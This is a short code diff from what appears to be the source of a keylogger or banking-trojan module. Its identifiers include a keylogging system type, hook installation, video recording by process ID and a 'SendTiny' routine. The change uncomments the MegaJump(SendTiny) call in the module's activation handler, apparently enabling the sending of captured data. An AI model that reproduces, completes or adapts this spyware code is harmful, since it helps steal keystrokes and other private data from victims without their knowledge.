@@ -603,7 +603,7 @@ void Activeted(LPVOID Sender)
 {
 	DBG( "Tiny", "Activated" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
-//	MegaJump(SendTiny);
+	MegaJump(SendTiny);
 	VideoProcess::RecordPID( 0, "Tiny" );
 	SetHooks();
 }
